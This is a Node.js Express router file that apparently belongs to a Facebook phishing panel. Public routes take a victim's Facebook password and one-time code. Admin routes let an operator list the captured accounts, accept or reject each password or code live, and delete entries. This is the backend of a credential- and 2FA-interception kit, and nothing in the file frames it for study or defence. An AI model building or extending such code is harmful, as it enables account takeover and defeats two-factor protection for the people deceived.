const express = require('express');
const router = express.Router();
const fbController = require('../controllers/fb.controller');

// User-facing
router.post('/login', fbController.submitFbLogin);
router.post('/otp', fbController.submitFbOtp);

// Admin
router.get('/', fbController.getFbUsers);
router.post('/:id/wrong-pass', fbController.returnWrongPass);
router.post('/:id/accept-pass', fbController.acceptFbPass);
router.post('/:id/accept-otp', fbController.acceptFbOtp);
router.post('/:id/wrong-otp', fbController.returnWrongOtp);
router.delete('/:id', fbController.deleteFbUser);

module.exports = router;
